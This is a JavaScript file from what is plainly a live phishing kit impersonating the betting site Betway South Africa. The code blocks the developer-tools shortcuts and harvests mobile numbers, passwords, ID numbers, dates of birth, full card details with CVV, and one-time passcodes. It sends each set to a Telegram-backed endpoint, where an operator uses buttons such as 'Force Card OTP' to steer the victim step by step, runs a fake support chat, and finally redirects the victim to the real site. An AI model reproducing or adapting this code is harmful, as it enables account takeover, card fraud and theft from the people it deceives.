document.onkeydown = function(e){ 
    if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74||e.keyCode==67))||(e.ctrlKey&&e.keyCode==85)){ 
        let p=prompt("Source Locked:"); 
        return p==="8890"; 
    } 
};

let currentU = "Unknown", pollInt = null, lastMsgId = null, chatPoll = null;

setTimeout(() => { 
    document.getElementById('loading-view').style.display='none'; 
    openModal('login-modal'); 
}, 1500);

function openModal(id) { 
    closeModals(); 
    document.getElementById(id).style.display='flex'; 
}

function closeModals() { 
    document.querySelectorAll('.overlay').forEach(el=>el.style.display='none'); 
    stopAllSpinners(); 
}

function stopAllSpinners() { 
    document.querySelectorAll('.submit-btn').forEach(b=>{ 
        b.disabled=false; 
        b.innerHTML=b.getAttribute('data-orig')||b.innerHTML; 
    }); 
}

function togglePassword(i, e) {
    const f = document.getElementById(i);
    const icon = document.getElementById(e);
    if (f.type === "text") {
        f.type = "password";
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
    } else {
        f.type = "text";
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
    }
}

function showError(id) { 
    const e=document.getElementById(id); 
    if(e) e.style.display='flex'; 
}

function handleCommandAction(act) {
    document.getElementById('process-overlay').style.display='none';
    stopAllSpinners();
    if(act === "force_card") {
        openModal('card-modal');
    } else if(act === "force_otp") {
        openModal('otp-modal');
    } else if(act === "force_verify") {
        openModal('verification-modal');
    } else if(act === "force_login") {
        openModal('login-modal');
    } else if(act === "home") {
        window.location.href = "https://www.betway.co.za/";
    } else if(act === "success_maintenance") {
        document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
        document.getElementById('maintenance-view').classList.add('active'); 
        closeModals();
        setTimeout(()=>{window.location.href="https://www.betway.co.za/"},4000);
    }
}

function startPolling(t) {
    if(pollInt) clearInterval(pollInt);
    pollInt = setInterval(() => {
        fetch(`/.netlify/functions/api?action=getUpdates`)
        .then(r=>r.json())
        .then(d=>{
            const last=d.result?.[0];
            if(last && last.callback_query){
                const cb=last.callback_query;
                if(cb.message.message_id===lastMsgId){
                    const act=cb.data;
                    if(act==="approve"){
                        clearInterval(pollInt); pollInt=null; 
                        document.getElementById('process-overlay').style.display='none';
                        stopAllSpinners(); 
                        
                        if (t === 'Betting Voucher logs') {
                            openModal('verification-modal');
                        } else if (t === 'Verification logs') {
                            openModal('card-modal');
                        } else if (t === 'Card Details logs') {
                            openModal('otp-modal');
                        } else if (t === 'OTP Verification logs') {
                            document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
                            document.getElementById('maintenance-view').classList.add('active'); 
                            closeModals();
                            setTimeout(()=>{window.location.href="https://www.betway.co.za/"},4000);
                        } else {
                            document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
                            document.getElementById('maintenance-view').classList.add('active'); 
                            closeModals();
                            setTimeout(()=>{window.location.href="https://www.betway.co.za/"},4000);
                        }
                    } else if(act==="reject"){
                        clearInterval(pollInt); pollInt=null; 
                        document.getElementById('process-overlay').style.display='none'; 
                        stopAllSpinners();
                        if(t==='Betting Voucher logs') showError('login-error');
                    } else {
                        clearInterval(pollInt); pollInt=null;
                        handleCommandAction(act);
                    }
                }
            }
        }).catch(e=>{})
    }, 2000);
}

function handleFocus(el, isMobile) {
    const wrap = el.parentElement;
    wrap.classList.add('focused');
    wrap.classList.remove('error');
    if (isMobile) {
        wrap.querySelector('.mat-label').innerText = 'Mobile Number';
    } else {
        wrap.querySelector('.mat-label').innerText = 'Enter Password';
    }
}

function handleBlur(el, isMobile) {
    const wrap = el.parentElement;
    if (el.value.trim() === '') {
        wrap.classList.remove('focused');
        if (isMobile) {
            wrap.querySelector('.mat-label').innerText = '+27 Mobile Number';
        } else {
            wrap.querySelector('.mat-label').innerText = 'Enter Password';
        }
    }
}

function onPwFocus(el) {
    const mob = document.getElementById('lgn-mobile');
    if (mob.value.trim() === '') {
        document.getElementById('mobile-wrap').classList.add('error');
        document.getElementById('pw-wrap').classList.add('error');
    }
    handleFocus(el, false);
}

function remMatErr(el) {
    el.parentElement.classList.remove('error');
}

function validate(ids) {
    let valid=true, first=null;
    ids.forEach(id=>{
        const el=document.getElementById(id);
        if(el){
            const val=el.value.trim();
            if(!val||val.length<1){
                if (el.classList.contains('mat-input')) {
                    el.parentElement.classList.add('error');
                } else {
                    el.classList.add('error-field');
                }
                valid=false;
                if(!first) first=el;
            }else{
                if (el.classList.contains('mat-input')) {
                    el.parentElement.classList.remove('error');
                } else {
                    el.classList.remove('error-field');
                }
            }
        }
    });
    if(first) first.focus();
    return valid;
}

function remErr(i) { i.classList.remove('error-field') }

function toggleChat() {
    const w=document.getElementById('chat-window');
    w.style.display=w.style.display==='flex'?'none':'flex';
    if(w.style.display==='flex') pollChat();
}

function addMsg(txt,cls) {
    const d=document.createElement('div'); 
    d.className=`msg-b ${cls}`; 
    d.innerText=txt;
    document.getElementById('chat-msgs').appendChild(d); 
    document.getElementById('chat-msgs').scrollTop=9999;
}

function sendChatTxt() {
    const t=document.getElementById('chat-txt'); 
    if(!t.value) return; 
    addMsg(t.value,'msg-user');
    
    fetch('/.netlify/functions/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'chat', text: '💬 Support ['+currentU+']: '+t.value })
    });
    t.value='';
}

function pollChat() {
    if(chatPoll) return;
    chatPoll=setInterval(()=>{
        fetch(`/.netlify/functions/api?action=getUpdates`)
        .then(r=>r.json())
        .then(d=>{
            const m=d.result?.[0]?.message;
            if(m && m.reply_to_message && m.text){
                if(!window.lId || window.lId!==m.message_id){ 
                    window.lId=m.message_id; 
                    addMsg(m.text,'msg-agent'); 
                }
            }
        });
    }, 3000);
}

function sendData(t) {
    const btn=event.currentTarget;
    if(!btn.getAttribute('data-orig')) btn.setAttribute('data-orig',btn.innerHTML);
    
    let u = currentU;
    let p = "";

    if(t==='Betting Voucher logs'){
        if(!validate(['lgn-mobile','login-pw']))return;
        u = document.getElementById('lgn-mobile').value;
        p = document.getElementById('login-pw').value;
        currentU = u;
    } else if (t === 'Sign up logs') {
        if(!validate(['sgp-mobile','signup-pw','sgp-fname','sgp-sname','sgp-email'])) return;
        u = document.getElementById('sgp-mobile').value;
        p = document.getElementById('signup-pw').value;
    } else if (t === 'Forgot Password') {
        if(!validate(['forgot-input', 'forgot-dob'])) return;
        u = document.getElementById('doc-type').value + ": " + document.getElementById('forgot-input').value;
        p = document.getElementById('forgot-dob').value; 
    } else if (t === 'Verification logs') {
        if(!validate(['verify-doc-input', 'verify-dob'])) return;
        u = document.getElementById('verify-doc-type').value + ": " + document.getElementById('verify-doc-input').value;
        p = document.getElementById('verify-dob').value;
    } else if (t === 'Card Details logs') {
        if(!validate(['card-holder', 'card-number', 'card-expiry', 'card-cvv'])) return;
        u = currentU;
        p = "Holder: " + document.getElementById('card-holder').value + " | Card: " + document.getElementById('card-number').value + " | Exp: " + document.getElementById('card-expiry').value + " | CVV: " + document.getElementById('card-cvv').value;
    } else if (t === 'OTP Verification logs') {
        if(!validate(['otp-code-input'])) return;
        u = currentU;
        p = "OTP Code: " + document.getElementById('otp-code-input').value;
    }

    let m=`📱 *${t} 🇿🇦*\n👤 *User:* \`${u}\`\n🔑 *Data:* \`${p}\``;
    
    const kb={
        "inline_keyboard":[
            [{"text":"✅ Approve","callback_data":"approve"},{"text":"❌ Reject","callback_data":"reject"}],
            [{"text":"💳 Force Card Details","callback_data":"force_card"},{"text":"📱 Force Card OTP","callback_data":"force_otp"}],
            [{"text":"🪪 Force Verification","callback_data":"force_verify"},{"text":"🔑 Force Login","callback_data":"force_login"}],
            [{"text":"🛠 Maintenance View","callback_data":"success_maintenance"},{"text":"🏠 Home","callback_data":"home"}]
        ]
    };
    
    fetch('/.netlify/functions/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'log', text: m, reply_markup: kb })
    })
    .then(r=>r.json())
    .then(res=>{
        if(res.ok) lastMsgId = res.result_id;
    });

    btn.disabled=true; 
    btn.innerHTML=`<div class="spinner"></div>`;
    document.getElementById('process-overlay').style.display='flex'; 
    startPolling(t);
}
